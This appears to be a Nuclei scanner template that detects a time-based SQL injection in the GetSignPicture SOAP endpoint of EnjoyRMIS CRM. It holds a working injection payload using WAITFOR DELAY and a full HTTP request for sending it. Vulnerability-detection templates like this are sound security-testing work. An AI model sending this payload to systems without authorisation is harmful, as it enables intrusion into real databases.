folder-5/poc-yaml-enjoyrmis-getsignpicture-sqli.yaml

id: poc-yaml-enjoyrmis-getsignpicture-sqli
info:
  name: "昂捷CRM GetSignPicture SQL注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects a SQL injection vulnerability in the GetSignPicture
    function of the EnjoyRMIS CRM application.

variables:
  t1: "{{rand_int(3, 8)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        POST /enjoyRMIS_WS/WS/OA/CWSOffice.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetSignPicture"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetSignPicture xmlns="http://tempuri.org/">
              <sGuid>1';WAITFOR DELAY '0:0:{{t1}}'--</sGuid>
            </GetSignPicture>
          </soap:Body>
        </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "GetSignPictureResponse"
          - "<sMsg>没有印章或签名记录</sMsg>"
      - type: word
        part: header
        words:
          - "text/xml"
      - type: dsl
        dsl:
          - "duration > t1"
          - "duration < t2"
